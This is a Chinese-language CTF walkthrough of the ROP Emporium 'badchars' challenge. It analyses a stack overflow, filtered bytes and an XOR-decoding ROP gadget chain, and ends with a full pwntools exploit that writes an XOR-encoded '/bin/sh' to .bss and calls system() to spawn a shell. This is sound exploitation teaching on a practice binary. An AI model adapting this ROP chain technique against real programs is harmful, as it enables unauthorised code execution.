---
title: ROP Emporium の badchars
date: 2020-06-05 11:32:06
categories: 
- WriteUPs
- ROP Emporium
tags: 
- PWN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;[ROP Emporium](https://ropemporium.com)训练4：badchars的解析。

<!-- more -->

## badchars32

### Step 1

&emsp;&emsp;程序正常运行截图：

![](/img/badchars/badchars1.png)

&emsp;&emsp;可以看到运行时提示badchars，结合题目说明，可能这些字符串会被程序特殊处理。

&emsp;&emsp;checksec：32位程序，依然只开启了DEP保护

![](/img/badchars/badchars2.png)

### Step 2

&emsp;&emsp;将程序丢到IDA Pro中去（至于为什么没用hopper，只能说这题需要理解下程序，而hopper的伪代码不够C……），先看下main函数：

![](/img/badchars/badchars3.png)

&emsp;&emsp;main函数聚焦在pwnme函数:

![](/img/badchars/badchars4.png)

&emsp;&emsp;首先发现memcpy函数存在栈溢出漏洞，其次出现了两个函数nstrlen和checkBadchars：

![](/img/badchars/badchars5.png)

&emsp;&emsp;nstrlen函数是当遇到0xa（ASII码10即’\n’）时就截断。

![](/img/badchars/badchars6.png)

&emsp;&emsp;checkBadchars函数是遇到\x62（ASII码98即’b’）、\x69（ASII码105即’i’）、\x63（ASII码99即’c'）、\x2f（ASII码47即’/'）、\x20（ASII码32即’<space>'）、\x66（ASII码102即’f'）、\x6e（ASII码110即’n'）、\x73（ASII码115即’s’）时将其替换成’-21’。

&emsp;&emsp;还发现程序中是存在system函数的，但是没有’/bin/sh’字符串。所以我们需要将需要的字符串写入内存，这样就会遇到’/’、’b’、’s’被过滤的情况。

&emsp;&emsp;为了解决这个情况，根据题目的提示，需要通过XOR（异或）对输入的字符串加密后输入然后再解密。

### Step 3

&emsp;&emsp;顺着这个思路首先解决第一个问题，字符串写到哪里。看一下各个段的权限，下面的段是有写权限的：

![](/img/badchars/badchars7.png)

&emsp;&emsp;.bss段是空的所以可以把字符串写在.bss段。

&emsp;&emsp;然后是第二个问题怎么实现异或，通过ROPgadget找一下：

![](/img/badchars/badchars8.png)

&emsp;&emsp;果然在0x08048890这里存在这样一条XOR指令可以利用。通过这条指令我们可以将XOR后的’/bin/sh’字符串传入，通过这条指令解密后再作为system函数的参数。

&emsp;&emsp;接着是XOR值的选择，我们可以写个简单的脚本找一下：

```Python
badchars = '\x62\x69\x63\x2f\x20\x66\x6e\x73'

sh_string = '/bin/sh\x00'

def xor(sh_str):
    i = 0
    for j in range(len(sh_str)):
        tmp = chr(ord(sh_str[j]) ^ i)
        if tmp in badchars:
            i = i + 1
    print i

xor(sh_string)
```

&emsp;&emsp;运行结果为2，即当’/bin/sh\x00’和2异或的时候不会出现被过滤的字符。

&emsp;&emsp;当然还需要找一个指令段帮助控制ebx和cl寄存器（32位的ecx寄存器分为两个16位的cx寄存器，cx寄存器再分成8位的ch和cl寄存器）的值，也通过ROPgadget找一下：

![](/img/badchars/badchars9.png)

&emsp;&emsp;最后就是找两个指令段，分别辅助写入和控制寄存器：

![](/img/badchars/badchars10.png)

&emsp;&emsp;图中标记的一对指令刚好满足条件。

### Step 4

&emsp;&emsp;思路顺利之后就是写EXP了：

```Python
* from pwn import *
* 
* sh = process('./badchars32')
* elf = ELF('./badchars32')
* 
* sys_addr = elf.symbols['system']
* bss_addr = 0x0804a040
* 
* xor_addr = 0x08048890
* #pop_ebx_addr = 0x08048461
* #pop_ecx_addr = 0x08048897
* pop_ebx_ecx_addr = 0x08048896
* 
* mov_addr = 0x08048893
* pop_addr = 0x08048899
* 
* shell = '/bin/sh\x00'
* xor_shell = ''
* for i in shell:
* xor_shell += chr(ord(i) ^ 2)
* 
* payload = 'a' * (0x28 + 0x4)
* payload += p32(pop_addr) + xor_shell[0:4] + p32(bss_addr) + p32(mov_addr)
* payload += p32(pop_addr) + xor_shell[4:8] + p32(bss_addr + 4) + p32(mov_addr)
* 
* for j in range(len(xor_shell)):
* #payload += p32(pop_ebx_addr)
* #payload += p32(bss_addr + j)
* #payload += p32(pop_ecx_addr)
* payload += p32(pop_ebx_ecx_addr)
* payload += p32(bss_addr + j)
* payload += p32(2)
* payload += p32(xor_addr)
* 
* payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;注释掉的部分是在传入的XOR加密shellcode解密时候，将xor指令的传参分成两步进行，可是却无法正确getshell，希望有大佬可以解惑。

&emsp;&emsp;EXP运行结果：

![](/img/badchars/badchars11.png)

## badchars

&emsp;&emsp;64位程序和32位思路一样，传参的时候甚至更加简单，因为可以一次性将需要的字符串写入内存。

## Tips

&emsp;&emsp;写入的字符串可以是’sh\x00\x00’，这样32位程序也可以实现一次性传参，前提是sh系统变量就是默认的’/bin/sh’命令。